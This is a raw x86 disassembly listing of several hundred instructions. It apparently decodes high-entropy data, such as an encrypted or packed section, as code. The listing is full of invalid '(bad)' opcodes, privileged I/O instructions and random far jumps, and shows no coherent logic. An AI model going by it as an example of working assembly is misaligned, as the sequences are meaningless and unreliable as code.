  439d19:	daa    
  439d1a:	popa   
  439d1b:	clc    
  439d1c:	sti    
  439d1d:	or     esi,edx
  439d1f:	mov    ds:0xf26699ed,al
  439d24:	enter  0xd5f0,0x27
  439d28:	mov    ds:0x9537617e,al
  439d2d:	(bad)
  439d31:	pusha  
  439d32:	lahf   
  439d33:	jnp    0x439d23
  439d35:	and    edx,edx
  439d37:	xor    esp,edi
  439d39:	jle    0x439cea
  439d3b:	shl    DWORD PTR ds:0x63bf7aa9,1
  439d41:	int    0x60
  439d43:	sbb    al,0x4b
  439d45:	jmp    0x7f63:0x63f06ef0
  439d4c:	fist   DWORD PTR [eax-0x45]
  439d4f:	lods   al,BYTE PTR ds:[esi]
  439d50:	or     al,0xf
  439d52:	ffree  st(6)
  439d54:	jb     0x439cf4
  439d56:	and    al,0xde
  439d58:	inc    BYTE PTR [ecx]
  439d5a:	add    DWORD PTR [ebx-0x5f],ebx
  439d5d:	dec    esi
  439d5e:	and    al,0x66
  439d60:	(bad)  
  439d61:	push   ebp
  439d62:	push   es
  439d63:	or     DWORD PTR [esi-0x1889bb9b],0x23ba6e82
  439d6d:	xor    cl,BYTE PTR [edi]
  439d6f:	test   eax,0x3652f982
  439d74:	in     al,0x4a
  439d76:	lock inc esp
  439d78:	adc    al,0xc9
  439d7a:	and    BYTE PTR [edi-0x2dcec808],dl
  439d80:	jmp    0x5de0f253
  439d85:	mov    ah,BYTE PTR [esp+ecx*2+0x7ada323d]
  439d8c:	inc    esi
  439d8d:	mov    bh,0xd8
  439d8f:	mov    bh,0xa5
  439d91:	jmp    0x439dd1
  439d93:	inc    ebp
  439d94:	xchg   BYTE PTR [esi+0x4514d3c4],dl
  439d9a:	jl     0x439d8f
  439d9c:	xchg   BYTE PTR ds:0xc931aa,dl
  439da2:	cmp    eax,0xf20e8060
  439da7:	aad    0x10
  439da9:	fld    TBYTE PTR [ebp+0x7006c7aa]
  439daf:	inc    ebp
  439db0:	jbe    0x439d46
  439db2:	sbb    ebp,DWORD PTR [eax+eiz*8-0x1d5c71e5]
  439db9:	adc    DWORD PTR [eax-0x64],esi
  439dbc:	add    BYTE PTR [edx+0x1b],bh
  439dbf:	loop   0x439d4e
  439dc1:	mov    ch,0x7d
  439dc3:	fcmove st,st(5)
  439dc5:	in     eax,dx
  439dc6:	xor    BYTE PTR [ecx-0x7c],bl
  439dc9:	inc    eax
  439dca:	sbb    BYTE PTR [edx+0x63],bh
  439dcd:	mov    WORD PTR [edx-0x125113],cs
  439dd3:	clc    
  439dd4:	mov    esp,0x427e5817
  439dd9:	gs pop esi
  439ddb:	iret   
  439ddc:	test   al,0xb3
  439dde:	fisubr WORD PTR [eax]
  439de0:	neg    ebx
  439de2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439de3:	mov    esi,0x5f263531
  439de8:	outs   dx,BYTE PTR ds:[esi]
  439de9:	mov    eax,0x57551d6c
  439dee:	push   es
  439def:	inc    ebx
  439df0:	jno    0x439df8
  439df2:	out    dx,eax
  439df3:	cmp    ah,bl
  439df5:	loope  0x439de3
  439df7:	pop    es
  439df8:	jnp    0x439e34
  439dfa:	lea    ebp,[ebx-0x7383ecfb]
  439e00:	shl    DWORD PTR [edx-0x59],cl
  439e03:	sahf   
  439e04:	pop    ds
  439e05:	sbb    eax,0x1f3f1b7e
  439e0a:	adc    dh,BYTE PTR [edx]
  439e0c:	pop    edx
  439e0d:	popf   
  439e0e:	outs   dx,BYTE PTR ds:[esi]
  439e0f:	aam    0xcb
  439e11:	popf   
  439e12:	std    
  439e13:	or     eax,0x94bcaa5f
  439e18:	in     al,0xb4
  439e1a:	sti    
  439e1b:	ss xchg ebp,eax
  439e1d:	mov    ecx,DWORD PTR [edi+0x2f]
  439e20:	ins    BYTE PTR es:[edi],dx
  439e21:	fsub   DWORD PTR [ecx+edx*8+0x6b02629d]
  439e28:	retf   0x2702
  439e2b:	ret    0x2a4d
  439e2e:	dec    ebx
  439e2f:	add    esi,esi
  439e31:	mov    dl,0x41
  439e33:	pop    es
  439e34:	pop    ss
  439e35:	repnz or eax,0x1ada3eb7
  439e3b:	jmp    0xf6d0:0x146f449f
  439e42:	and    al,0x32
  439e44:	sahf   
  439e45:	or     ebp,DWORD PTR [edi+0x32]
  439e48:	test   DWORD PTR [ecx+0x4e],edx
  439e4b:	jo     0x439dd2
  439e4d:	out    0xbd,eax
  439e4f:	inc    ebp
  439e50:	jbe    0x439e5c
  439e52:	cmp    eax,0x68e93d08
  439e57:	daa    
  439e58:	or     dh,BYTE PTR [esi+0x65]
  439e5b:	sbb    DWORD PTR [edx+0xd],0x2cc8271e
  439e62:	mov    edx,0xea71a57c
  439e67:	pop    ebx
  439e68:	and    ebx,edx
  439e6a:	inc    ebp
  439e6b:	(bad)  
  439e6c:	rcl    DWORD PTR ds:0xcf66d75a,1
  439e72:	test   DWORD PTR [edi],ecx
  439e74:	cs and al,0x1c
  439e77:	jb     0x439e0c
  439e79:	icebp  
  439e7a:	ins    DWORD PTR es:[edi],dx
  439e7b:	out    dx,eax
  439e7c:	in     eax,dx
  439e7d:	into   
  439e7e:	out    0x23,eax
  439e80:	push   es
  439e81:	dec    eax
  439e82:	cli    
  439e83:	nop
  439e84:	pop    edi
  439e85:	loope  0x439ea0
  439e87:	or     al,0xf
  439e89:	push   0x41351576
  439e8e:	enter  0x51c0,0x25
  439e92:	imul   ecx,DWORD PTR [edx+0x23],0x73
  439e96:	jmp    0xe3b5:0x4c736bb0
  439e9d:	sbb    eax,0x9bc19375
  439ea2:	adc    al,0x79
  439ea4:	retf   0xc72c
  439ea7:	xchg   edx,eax
  439ea8:	popf   
  439ea9:	push   0x78
  439eab:	aad    0x9
  439ead:	jmp    0x439e82
  439eaf:	pop    edi
  439eb0:	test   BYTE PTR [ebx+0x29],al
  439eb3:	out    dx,al
  439eb4:	dec    ecx
  439eb5:	ret    
  439eb6:	push   ebp
  439eb7:	dec    BYTE PTR [edx+0x6e]
  439eba:	jo     0x439e89
  439ebc:	cmp    al,0x9f
  439ebe:	ds cmp eax,0x35d6f12b
  439ec4:	fnstcw WORD PTR [ecx]
  439ec6:	push   0x14
  439ec8:	push   cs
  439ec9:	aaa    
  439eca:	lock and edx,edx
  439ecd:	fldenv [edi+eax*4]
  439ed0:	(bad)  
  439ed1:	mov    bh,0x3e
  439ed3:	retf   
  439ed4:	mov    BYTE PTR [edx+0x35935ac6],0xae
  439edb:	xchg   BYTE PTR [edi+0x10b494f1],ah
  439ee1:	faddp  st(2),st
  439ee3:	bswap  edi
  439ee5:	jne    0x439ecc
  439ee7:	popf   
  439ee8:	sbb    BYTE PTR [eax+0x3b],ch
  439eeb:	leave  
  439eec:	xchg   DWORD PTR [esi-0x3bcf03f3],esi
  439ef2:	je     0x439ed3
  439ef4:	loop   0x439f34
  439ef6:	pop    esp
  439ef7:	adc    al,BYTE PTR [edi+ebp*2]
  439efa:	jnp    0x439f2a
  439efc:	sahf   
  439efd:	jae    0x439f64
  439eff:	add    dl,bl
  439f01:	fwait
  439f02:	sub    ebx,edx
  439f04:	sti    
  439f05:	and    ebp,esp
  439f07:	out    dx,al
  439f08:	jmp    0x753d8884
  439f0d:	push   eax
  439f0e:	jbe    0x439ea8
  439f10:	mov    ah,0xe8
  439f12:	mov    ds,WORD PTR [eax-0x24]
  439f15:	mov    eax,0x2d0510cb
  439f1a:	sub    BYTE PTR [edx-0x154ebc3b],al
  439f20:	add    ebp,DWORD PTR [ebx]
  439f22:	push   es
  439f23:	push   ecx
  439f24:	test   eax,0xb0f5742a
  439f29:	adc    ecx,edx
  439f2b:	inc    eax
  439f2c:	jmp    0x545d90df
  439f31:	call   0x1fb1:0x51b1180
  439f38:	jns    0x439f7d
  439f3a:	jecxz  0x439edf
  439f3c:	or     BYTE PTR [esi],ah
  439f3e:	into   
  439f3f:	pusha  
  439f40:	pusha  
  439f41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439f42:	in     al,dx
  439f43:	adc    DWORD PTR [eax-0x2],esp
  439f46:	data16 js 0x439f95
  439f49:	pop    edx
  439f4a:	out    dx,eax
  439f4b:	sbb    al,0x6c
  439f4d:	leave  
  439f4e:	xchg   ecx,eax
  439f4f:	add    al,0xcd
  439f51:	aaa    
  439f52:	cmp    edx,DWORD PTR [esi+0x4e]
  439f55:	add    ch,0x1b
  439f58:	xchg   edx,eax
  439f59:	(bad)  
  439f5a:	sbb    dl,al
  439f5c:	rcr    BYTE PTR [edx-0x9],1
  439f5f:	xchg   edi,eax
  439f60:	push   edi
  439f61:	scas   al,BYTE PTR es:[edi]
  439f62:	ficomp DWORD PTR [edx]
  439f64:	sbb    DWORD PTR [edi-0x77d3b3ed],esp
  439f6a:	push   ecx
  439f6b:	push   0xffffff85
  439f6d:	std    
  439f6e:	imul   edi,DWORD PTR [edi-0x20f3e390],0xffffffbf
  439f75:	lahf   
  439f76:	lods   al,BYTE PTR ds:[si]
  439f78:	in     eax,dx
  439f79:	push   cs
  439f7a:	lds    esi,FWORD PTR [eax+eiz*1+0x7d]
  439f7e:	mov    esi,esp
  439f80:	pop    ecx
  439f81:	lods   eax,DWORD PTR ds:[esi]
  439f82:	(bad)  
  439f83:	jmp    0x22e5b6d1
  439f88:	xchg   ebp,edi
  439f8a:	push   esp
  439f8b:	das    
  439f8c:	xchg   esp,eax
  439f8d:	gs pop ebp
  439f8f:	ins    BYTE PTR es:[edi],dx
  439f90:	dec    ecx
  439f91:	(bad)  
  439f92:	out    0xa0,eax
  439f94:	add    BYTE PTR [edi],dl
  439f96:	mov    ds:0x44f6a963,al
  439f9b:	test   DWORD PTR [edx+0x47],edx
  439f9e:	mov    eax,0x815691aa
  439fa3:	and    dl,BYTE PTR [edi-0x78]
  439fa6:	mov    ds:0x56efb2fc,eax
  439fab:	xchg   DWORD PTR [esp+eiz*8+0x28],esi
  439faf:	psubq  mm0,mm5
  439fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439fb3:	xor    DWORD PTR [ebp+0x7d],ecx
  439fb6:	fs push ebx
  439fb8:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439fba:	rol    BYTE PTR [edx-0x48],cl
  439fbd:	out    dx,al
  439fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439fbf:	shr    DWORD PTR [edx+0x9],cl
  439fc2:	into   
  439fc3:	sahf   
  439fc4:	xchg   edi,eax
  439fc5:	mov    WORD PTR [ecx+edi*4],es
  439fc8:	div    DWORD PTR [edx+0x5e7ae37b]
  439fce:	stc    
  439fcf:	pop    eax
  439fd0:	imul   ecx,esp,0xa7174522
  439fd6:	scas   eax,DWORD PTR es:[edi]
  439fd7:	test   DWORD PTR [ebp-0x162cd2bc],0xd4fe63fd
  439fe1:	cmp    al,BYTE PTR [ebx]
  439fe3:	xor    DWORD PTR [edx-0x58],esp
  439fe6:	inc    ebp
  439fe7:	push   ebp
  439fe8:	adc    BYTE PTR [edi+0x6b792949],0x26
  439fef:	lods   al,BYTE PTR ds:[esi]
  439ff0:	daa    
  439ff1:	loopne 0x439f8c
  439ff3:	inc    edi
  439ff4:	(bad)  
  439ff5:	aam    0x5c
  439ff7:	pop    es
  439ff8:	das    
  439ff9:	sbb    dh,dl
  439ffb:	pushf  
  439ffc:	and    DWORD PTR [ecx],esi
  439ffe:	test   al,0xa0
  43a000:	sbb    eax,0x566ee3b
  43a005:	xchg   edx,eax
  43a006:	popa   
  43a007:	jle    0x439ff3
  43a009:	dec    edx
  43a00a:	mov    bl,0x1b
  43a00c:	ins    DWORD PTR es:[edi],dx
  43a00d:	adc    BYTE PTR [eax],dl
  43a00f:	cmc    
  43a010:	test   al,0x11
  43a012:	pop    esi
  43a013:	sub    DWORD PTR [eax-0xf468502],edi
  43a019:	add    ch,BYTE PTR [esi+0x10]
  43a01c:	movaps xmm3,XMMWORD PTR [esi]
  43a01f:	cmp    ah,BYTE PTR [edi]
  43a021:	aam    0xb8
  43a023:	add    al,0x83
  43a025:	push   esp
  43a026:	xchg   esi,eax
  43a027:	lock jl 0x439fe7
  43a02a:	lock call 0xea9a:0x2d24d7f1
  43a032:	ins    DWORD PTR es:[edi],dx
  43a033:	sbb    DWORD PTR [ecx-0x41],eax
  43a036:	dec    eax
  43a037:	inc    edi
  43a038:	push   ebx
  43a039:	dec    eax
  43a03a:	loopne 0x43a027
  43a03c:	imul   edi,ebp,0x1c
  43a03f:	hlt    
  43a040:	inc    edx
  43a041:	(bad)  
  43a042:	ret    
  43a043:	setns  BYTE PTR [edi]
  43a046:	xor    al,dl
  43a048:	sbb    eax,0xdfefb178
  43a04d:	mov    ebp,ebx
  43a04f:	test   DWORD PTR [esi+eax*4+0xfe6f782],esi
  43a056:	xor    bl,ah
  43a058:	and    DWORD PTR [ecx+ecx*2],edi
  43a05b:	(bad)  
  43a05c:	pop    ds
  43a05d:	adc    eax,DWORD PTR [edx]
  43a05f:	sub    al,0x45
  43a061:	nop
  43a062:	mov    ebp,0x88e36eee
  43a067:	ins    DWORD PTR es:[edi],dx
  43a068:	gs sahf 
  43a06a:	inc    ecx
  43a06b:	dec    edi
  43a06c:	sbb    eax,0x27fdd7f6
  43a071:	sbb    DWORD PTR [esi],edx
  43a073:	inc    esp
  43a074:	cmp    ebp,DWORD PTR [esp+eiz*4+0x5ba0dd1d]
  43a07b:	cld    
  43a07c:	int    0x39
  43a07e:	lock pop ds
  43a080:	rcl    bh,cl
  43a082:	mov    esp,0xf3e631b7
  43a087:	lahf   
  43a088:	fcomp  DWORD PTR [ebp-0x58]
  43a08b:	jns    0x43a05f
  43a08d:	push   0x6f592281
  43a092:	idiv   BYTE PTR [eax-0x2624111d]
  43a098:	or     DWORD PTR [ecx],esi
  43a09a:	call   FWORD PTR [ebx]
  43a09c:	addr16 aaa 
  43a09e:	pop    eax
  43a09f:	add    eax,0xa46868a3
  43a0a4:	push   esp
  43a0a5:	rcr    BYTE PTR [eax],0xaf
  43a0a8:	fidivr DWORD PTR [ecx+0x45]
  43a0ab:	cli    
  43a0ac:	sbb    eax,0x8a02ba06
  43a0b1:	(bad)  
  43a0b2:	(bad)  
  43a0b3:	mov    ds:0x679c4544,al
  43a0b8:	adc    ecx,DWORD PTR [ebx+0xf]
  43a0bb:	jne    0x43a125
  43a0bd:	dec    eax
  43a0be:	xor    eax,0xa74f0d15
  43a0c3:	mov    esi,DWORD PTR [esi]
  43a0c5:	mov    ebp,0xe007950c
  43a0ca:	xchg   edx,eax
  43a0cb:	jp     0x43a143
  43a0cd:	inc    ebp
  43a0ce:	pushf  
  43a0cf:	loope  0x43a0ca
  43a0d1:	cld    
  43a0d2:	fild   QWORD PTR ds:0xa7b67773
  43a0d8:	or     ebp,esi
  43a0da:	pop    esp
  43a0db:	sub    eax,0x42d5c465
  43a0e0:	stc    
  43a0e1:	add    cl,BYTE PTR [ecx+edx*1-0x4b]
  43a0e5:	adc    al,0x83
  43a0e7:	add    al,0x15
  43a0e9:	pop    edx
  43a0ea:	mov    edi,0x785127e9
  43a0ef:	shl    DWORD PTR [edi-0x1d638c06],1
  43a0f5:	sbb    DWORD PTR ds:0xfedd0913,esp
  43a0fb:	mov    ds:0xf1675f03,al
  43a100:	pop    eax
  43a101:	pop    es
  43a102:	out    dx,eax
  43a103:	mov    cl,BYTE PTR [edi]
  43a105:	push   eax
  43a106:	stos   DWORD PTR es:[edi],eax
  43a107:	mov    WORD PTR [eax+0x6051bbb3],cs
  43a10d:	inc    esi
  43a10e:	dec    edi
  43a10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a110:	jmp    0x43a0e6
  43a112:	frstor [ecx+ebp*2-0xb]
  43a116:	or     BYTE PTR [ecx+ebp*2],ah
  43a119:	fwait
  43a11a:	dec    esp
  43a11b:	push   cs
  43a11c:	pop    ss
  43a11d:	mov    ecx,ss
  43a11f:	repnz or edx,DWORD PTR [ebx+0x79]
  43a123:	xor    dl,BYTE PTR [edx]
  43a125:	sbb    DWORD PTR [ecx+0x2bf23b13],0x807d429a
  43a12f:	jne    0x43a146
  43a131:	inc    eax
  43a132:	sub    eax,0xfd82d853
  43a137:	das    
  43a138:	mov    dh,0xc9
  43a13a:	mov    eax,ds:0x8697ea57
  43a13f:	ret    
  43a140:	sbb    eax,0x9317e62e
  43a145:	adc    DWORD PTR [ecx],eax
  43a147:	test   DWORD PTR [edi-0x58],esp
  43a14a:	and    ch,ah
  43a14c:	enter  0x2b7b,0xe2
  43a150:	cmp    eax,0x6f8587ec
  43a155:	mov    esp,cr2
  43a158:	or     BYTE PTR [eax-0x2],ah
  43a15b:	test   BYTE PTR [edx+0x4f],ah
  43a15e:	enter  0x38b,0x9
  43a162:	sub    ebx,ebx
  43a164:	cmp    BYTE PTR [ebp-0x79],0xf8
  43a168:	nop
  43a169:	ds je  0x43a189
  43a16c:	inc    eax
  43a16d:	add    eax,0x7e59a9c8
  43a172:	lods   al,BYTE PTR ds:[esi]
  43a173:	jp     0x43a18c
  43a175:	sbb    eax,0x1efb7255
  43a17a:	pop    DWORD PTR [ebx]
  43a17c:	lods   al,BYTE PTR ds:[esi]
  43a17d:	ins    BYTE PTR es:[edi],dx
  43a17e:	test   eax,0x454b924c
  43a183:	push   ss
  43a184:	push   cs
  43a185:	rcr    DWORD PTR [esi-0x54],1
  43a188:	mov    bl,0x25
  43a18a:	or     ch,BYTE PTR [edi+0x67]
  43a18d:	retf   0xbb09
  43a190:	pushf  
  43a191:	out    0x9a,al
  43a193:	aas    
  43a194:	outs   dx,DWORD PTR fs:[esi]
  43a196:	cmp    bh,BYTE PTR [esi+0x78ec8932]
  43a19c:	pusha  
  43a19d:	add    DWORD PTR [ecx+ecx*8-0x57dfea0c],ebx
  43a1a4:	sbb    BYTE PTR [edi-0x55],0xde
  43a1a8:	sub    al,0x9
  43a1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a1ab:	cmc    
  43a1ac:	jns    0x43a229
  43a1ae:	lods   al,BYTE PTR ds:[esi]
  43a1af:	push   esi
  43a1b0:	retf   0x7f63
  43a1b3:	pop    ds
  43a1b4:	fild   DWORD PTR [ebp+ebp*8-0x44]
  43a1b8:	retf   
  43a1b9:	cmc    
  43a1ba:	xor    al,0x81
  43a1bc:	mov    ecx,0x2d09f967
  43a1c1:	dec    esi
  43a1c2:	jecxz  0x43a14b
  43a1c4:	(bad)  
  43a1c5:	call   0xb713:0x632952fe
  43a1cc:	std    
  43a1cd:	add    BYTE PTR [esi+esi*4],al
  43a1d0:	mov    WORD PTR [ebx-0xd],0xa4a3
  43a1d6:	inc    ebp
  43a1d7:	cmp    cl,bl
  43a1d9:	arpl   WORD PTR [edi-0x5fcae158],bp
  43a1df:	fild   WORD PTR [edx+edx*2+0x4d]
  43a1e3:	rcl    ah,0xba
  43a1e6:	mov    ecx,0x19ac6a8c
  43a1eb:	(bad)  
  43a1ec:	aad    0x4c
  43a1ee:	sub    al,0xf2
  43a1f0:	inc    ebp
  43a1f1:	inc    esp
  43a1f2:	lods   al,BYTE PTR ds:[esi]
  43a1f3:	mov    eax,0x102fb421
  43a1f8:	out    0xca,al
  43a1fa:	repz push esp
  43a1fc:	test   eax,0x16700708
  43a201:	inc    ebx
  43a202:	(bad)  
  43a203:	mov    al,0x2e
  43a205:	jne    0x43a259
  43a207:	cs xor cl,0x63
  43a20b:	test   eax,0x1273c6bd
  43a210:	mov    WORD PTR [edi-0x1b],ds
  43a213:	cmp    bl,bl
  43a215:	mov    bl,0x38
  43a217:	fs daa 
  43a219:	push   0x93bb298a
  43a21e:	shl    DWORD PTR [edi-0x62],1
  43a221:	cmp    ecx,0xffffffda
  43a224:	adc    al,0xfb
  43a226:	ins    DWORD PTR es:[edi],dx
  43a227:	int    0x1a
  43a229:	mov    ch,0x34
  43a22b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a22c:	dec    eax
  43a22d:	cli    
  43a22e:	push   es
  43a22f:	sub    BYTE PTR [ecx+0x2b],dl
  43a232:	repz pop eax
  43a234:	sbb    al,0xc6
  43a236:	cld    
  43a237:	les    edx,FWORD PTR [esi-0x1a725410]
  43a23d:	enter  0xb1ca,0x7c
  43a241:	int    0x2b
  43a243:	sbb    al,0x33
  43a245:	ret    0xe60c
  43a248:	inc    eax
  43a249:	xchg   ebx,eax
  43a24a:	jl     0x43a26f
  43a24c:	sbb    cl,BYTE PTR [edx+esi*4+0x78]
  43a250:	push   edi
  43a251:	aad    0x37
  43a253:	js     0x43a22f
  43a255:	stos   DWORD PTR es:[edi],eax
  43a256:	xor    al,BYTE PTR [edi+0x7e89bfc5]
  43a25c:	lea    edi,[ebx]
  43a25e:	mov    bh,BYTE PTR [ebx-0x163a8e86]
  43a264:	(bad)  
  43a265:	ja     0x43a219
  43a267:	xchg   ebp,eax
  43a268:	sar    BYTE PTR [ebp+0x3aff5b2a],cl
  43a26e:	stos   BYTE PTR es:[edi],al
  43a26f:	pop    ebx
  43a270:	in     eax,dx
  43a271:	push   edi
  43a272:	or     cl,dl
  43a274:	lock cmp al,0x62
  43a277:	retf   0x736d
  43a27a:	(bad)  
  43a27b:	xor    dh,bl
  43a27d:	(bad)  
  43a27f:	lds    edx,FWORD PTR [esi+eiz*4-0x25]
  43a283:	(bad)  
  43a284:	jmp    0xee1d702
  43a289:	jle    0x43a224
  43a28b:	fstp   DWORD PTR [eax+0x544bcc9c]
  43a291:	sbb    BYTE PTR [ecx],ah
  43a293:	xchg   edi,eax
  43a294:	pop    esi
  43a295:	pop    es
  43a296:	xchg   esi,eax
  43a297:	push   es
  43a298:	pushfw 
  43a29a:	pop    ss
  43a29b:	fisub  WORD PTR [esi]
  43a29d:	stos   DWORD PTR es:[edi],eax
  43a29e:	int3   
  43a29f:	loope  0x43a288
  43a2a1:	cmp    ch,cl
  43a2a3:	aad    0x42
  43a2a5:	ret    
  43a2a6:	lods   eax,DWORD PTR ds:[esi]
  43a2a7:	into   
  43a2a8:	adc    BYTE PTR [esi-0x29],bh
  43a2ab:	add    ebp,DWORD PTR [ebx+eiz*8+0xc]
  43a2af:	xchg   esi,eax
  43a2b0:	add    ch,BYTE PTR [ebp+0x622939c2]
  43a2b6:	lods   al,BYTE PTR ds:[esi]
  43a2b7:	cwde   
  43a2b8:	pop    esp
  43a2b9:	jne    0x43a2f1
  43a2bb:	shl    DWORD PTR [ecx+0x49],0x90
  43a2bf:	icebp  
  43a2c0:	sub    al,0x1b
  43a2c2:	push   ebx
  43a2c3:	jecxz  0x43a2f2
  43a2c5:	repz les esi,FWORD PTR [eax]
  43a2c8:	dec    ecx
  43a2c9:	outs   dx,DWORD PTR ds:[esi]
  43a2ca:	aad    0x4a
  43a2cc:	or     al,BYTE PTR [edx+0x4e6bf8ed]
  43a2d2:	adc    eax,0xf78bd124
  43a2d7:	cmp    ch,bl
  43a2d9:	and    DWORD PTR [edx-0x22bfc742],edi
  43a2df:	dec    eax
  43a2e0:	sahf   
  43a2e1:	fs mov edx,0x470b2efe
  43a2e7:	arpl   dx,bp
  43a2e9:	cs enter 0x77d5,0xc
  43a2ee:	mov    fs,edx
  43a2f0:	xor    dh,cl
  43a2f2:	inc    eax
  43a2f3:	pop    eax
  43a2f4:	out    0x73,al
  43a2f6:	ja     0x43a2d3
  43a2f8:	retf   
  43a2f9:	add    cl,cl
  43a2fb:	rcl    DWORD PTR [ecx-0x19],cl
  43a2fe:	fisttp WORD PTR [ebx+eax*1+0x484e2370]
  43a305:	mov    edi,0x491331db
  43a30a:	aad    0xa9
  43a30c:	inc    ecx
  43a30d:	stos   DWORD PTR es:[edi],eax
  43a30e:	sbb    eax,edi
  43a310:	mov    eax,ds:0xa797b1ae
  43a315:	add    BYTE PTR [ebx+edi*1-0x64c9ac53],0xb4
  43a31d:	xor    BYTE PTR [edi],ch
  43a31f:	mov    ebp,0x446a454b
  43a324:	fucom  st(2)
  43a326:	ins    DWORD PTR es:[edi],dx
  43a327:	loopne 0x43a2bf
  43a329:	xchg   edx,eax
  43a32a:	popf   
  43a32b:	xor    ebp,DWORD PTR [edx+0x14e88e60]
  43a331:	cwde   
  43a332:	je     0x43a2f9
  43a334:	sub    edx,edi
  43a336:	mov    bh,0xb1
  43a338:	mov    BYTE PTR [eax-0x6c],dl
  43a33b:	arpl   WORD PTR [ebx+0x14],di
  43a33e:	jl     0x43a333
  43a340:	xchg   esp,eax
  43a341:	ins    BYTE PTR es:[edi],dx
  43a342:	pop    esi
  43a343:	out    0xcc,eax
  43a345:	mov    ebx,0x3b9b418c
  43a34a:	hlt    
  43a34b:	ja     0x43a323
  43a34d:	cmp    al,0x1a
  43a34f:	mov    esi,0x591b3588
  43a354:	cmc    
  43a355:	stc    
  43a356:	sahf   
  43a357:	ret    
  43a358:	daa    
  43a359:	(bad)  
  43a35a:	popa   
  43a35b:	pop    edx
  43a35c:	imul   ecx,DWORD PTR [ecx+ecx*2],0xf4d1e8fd
  43a363:	dec    ebx
  43a364:	jmp    0x43a3b8
  43a366:	inc    ecx
  43a367:	jmp    0x232b944
  43a36c:	test   eax,0x819619da
  43a371:	and    dh,dh
  43a373:	mov    dh,dl
  43a375:	hlt    
  43a376:	lds    ebx,FWORD PTR [edi+esi*4]
  43a379:	cwde   
  43a37a:	jp     0x43a32f
  43a37c:	push   eax
  43a37d:	sub    al,0x74
  43a37f:	(bad)  
  43a380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a381:	fnstcw WORD PTR [ebp+eiz*1+0x68]
  43a385:	cld    
  43a386:	cs mov ecx,0x7115ff4
  43a38c:	dec    eax
  43a38d:	dec    ebp
  43a38e:	pop    edi
  43a38f:	xchg   ebp,eax
  43a390:	iret   
  43a391:	adc    ah,BYTE PTR [edx+ecx*8-0x1850b9ea]
  43a398:	ficomp DWORD PTR [eax-0x75]
  43a39b:	adc    ah,BYTE PTR [ebp-0x3dd0eb5b]
  43a3a1:	fsubr  st(2),st
  43a3a3:	aas    
  43a3a4:	inc    edx
  43a3a5:	hlt    
  43a3a6:	xchg   edx,eax
  43a3a7:	sbb    BYTE PTR [edx-0x1298f0b8],al
  43a3ad:	aaa    
  43a3ae:	inc    ecx
  43a3af:	aas    
  43a3b0:	sbb    al,0x71
  43a3b2:	adc    eax,ebx
  43a3b4:	mov    al,0x91
  43a3b6:	fnop   
  43a3b8:	test   eax,0x2079df0d
  43a3bd:	sbb    DWORD PTR [esi+esi*2],ecx
  43a3c0:	mov    fs,WORD PTR [edi]
  43a3c2:	cmp    al,0xff
  43a3c4:	mov    dl,0xc1
  43a3c6:	ret    0x6d13
  43a3c9:	inc    edi
  43a3ca:	xchg   DWORD PTR [edi+0x79],eax
  43a3cd:	ins    BYTE PTR es:[edi],dx
  43a3ce:	popf   
  43a3cf:	mov    esi,0xaa5de22f
  43a3d4:	fdiv   st(6),st
  43a3d6:	jp     0x43a413
  43a3d8:	jb     0x43a3ac
  43a3da:	pop    edi
  43a3db:	(bad)  
  43a3dc:	(bad)  
  43a3dd:	pop    ss
  43a3de:	stos   BYTE PTR es:[edi],al
  43a3df:	int    0x26
  43a3e1:	daa    
  43a3e2:	das    
  43a3e3:	pop    ds
  43a3e4:	push   eax
  43a3e5:	stc    
  43a3e6:	sbb    bl,bl
  43a3e8:	sub    edi,DWORD PTR [edi-0x270bebe3]
  43a3ee:	add    eax,0x6649c0b
  43a3f3:	xchg   bl,ah
  43a3f5:	sbb    BYTE PTR [edx-0x203a1845],ch
  43a3fb:	repz aam 0xe8
  43a3fe:	mov    eax,ds:0x67637b67
  43a403:	mov    ds,ebp
  43a405:	jl     0x43a41f
  43a407:	inc    ebp
  43a408:	inc    ebp
  43a409:	ins    BYTE PTR es:[edi],dx
  43a40a:	(bad)  
  43a40b:	popa   
  43a40c:	xor    dl,BYTE PTR [eax]
  43a40e:	or     DWORD PTR [eax+0x3be718bb],esp
  43a414:	pop    edx
  43a415:	mov    esi,0x63605a0e
  43a41a:	mov    al,0x23
  43a41c:	lock fild QWORD PTR [eax]
  43a41f:	mov    ah,0x3e
  43a421:	pop    edx
  43a422:	aam    0xd3
  43a424:	mov    esp,0xad48484f
  43a429:	ss dec edx
  43a42b:	ds sub edi,ebx
  43a42e:	jmp    0x156af9f0
  43a433:	in     al,dx
  43a434:	inc    ecx
  43a435:	mov    dl,0xc2
  43a437:	pop    esi
  43a438:	mov    al,0x99
  43a43a:	movaps XMMWORD PTR gs:[ebx-0x30],xmm5
  43a43f:	push   eax
  43a440:	stos   BYTE PTR es:[edi],al
  43a441:	inc    esi
  43a442:	xor    esp,DWORD PTR [ebx-0x49]
  43a445:	xchg   ebp,eax
  43a446:	and    al,0xd9
  43a448:	jno    0x43a439
  43a44a:	dec    edx
  43a44b:	cmc    
  43a44c:	or     esp,DWORD PTR [ebp+0x3b]
  43a44f:	jg     0x43a478
  43a451:	in     al,0x82
  43a453:	or     esi,DWORD PTR [edi-0x69]
  43a456:	sbb    DWORD PTR ss:[ecx-0x617c4ebd],0xee588289
  43a461:	fwait
  43a462:	sbb    bl,BYTE PTR [eax+esi*1+0x71]
  43a466:	sbb    DWORD PTR [ebx],ebp
  43a468:	xor    eax,0xec9723b7
  43a46d:	sub    DWORD PTR [ebp-0x4144f03],edi
  43a473:	repnz mov al,ds:0xebbf4fe9
  43a479:	ret    
  43a47a:	(bad)  
  43a47c:	mov    ebp,0x8ed64c98
  43a481:	sub    BYTE PTR [esi+0x51],bl
  43a484:	push   esi
  43a485:	shl    DWORD PTR ds:0xf7430954,1
  43a48b:	xchg   BYTE PTR [esi-0x4a],bh
  43a48e:	shl    DWORD PTR [esi+0x77],cl
  43a491:	or     BYTE PTR [ecx],cl
  43a493:	xor    al,0xf0
  43a495:	push   edx
